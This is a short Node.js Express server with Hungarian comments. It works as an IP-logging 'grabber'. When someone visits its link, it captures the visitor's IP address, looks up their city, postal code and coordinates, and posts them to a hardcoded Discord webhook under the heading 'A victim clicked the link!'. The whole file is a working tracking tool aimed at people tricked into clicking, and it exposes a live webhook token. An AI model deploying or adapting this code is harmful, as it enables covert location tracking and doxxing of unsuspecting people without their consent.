const express = require('express');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 3000;

// Fixált Discord Webhook URL
const webhookUrl = 'https://discord.com/api/webhooks/1163410175395373107/Tc5X6Ndt2R6qwVVbh5kVYgBSByLdEAC_mOQa9C7VbMjXxkgLUukRQVOFumbDRs5d1A9u';

// IP cím és hely információ küldése a Discordra
app.get('/send-ip', (req, res) => {
    // A látogató IP címének lekérése
    const userIp = req.headers['x-forwarded-for'] ? req.headers['x-forwarded-for'].split(',')[0] : req.connection.remoteAddress || req.ip;

    console.log('User IP: ', userIp); // Ellenőrizzük, hogy helyes IP-t kapunk-e

    // IP cím lekérdezése az ipapi API segítségével
    fetch(`https://ipapi.co/${userIp}/json/`)
        .then(geoResponse => geoResponse.json())
        .then(geoData => {
            // Az adatokat biztonságosan ellenőrizzük, hogy léteznek-e
            const network = geoData.network || 'N/A';
            const city = geoData.city || 'N/A';
            const region = geoData.region || 'N/A';
            const country = geoData.country_name || 'N/A';
            const postal = geoData.postal || 'N/A';
            const latitude = geoData.latitude || 'N/A';
            const longitude = geoData.longitude || 'N/A';

            // Ellenőrizzük, hogy a város és egyéb információk valóban rendelkezésre állnak
            if (city === 'N/A' && region === 'N/A' && country === 'N/A') {
                console.log(`A következő adatokat nem sikerült lekérni: Város: ${city}, Régió: ${region}, Ország: ${country}`);
            }

            const message = {
                username: "Helyszíni Naplózó <3",
                avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
                content: `<@1095731086513930260>`,
                embeds: [
                    {
                        title: 'Egy áldozat rákattintott a linkre!',
                        description: `**IP-cím >> **${userIp}\n**Hálózat >> ** ${network}\n**Város >> ** ${city}\n**Régió >> ** ${region}\n**Ország >> ** ${country}\n**Irányítószám >> ** ${postal}\n**Szélesség >> ** ${latitude}\n**Hosszúság >> ** ${longitude}`,
                        color: 0x800080
                    }
                ]
            };

            // Küldés Discordra
            axios.post(webhookUrl, message)
                .then(response => {
                    res.send('IP-cím és helyadatok sikeresen elküldve Discordra!');
                })
                .catch(error => {
                    res.send('Hiba történt a Discord webhook küldésekor.');
                });
        })
        .catch(error => {
            res.send('Hiba történt az IP cím lekérdezésekor!');
        });
});

// A gyökér útvonal beállítása
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html'); // Az index.html fájl kiszolgálása
});

// Szerver indítása
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
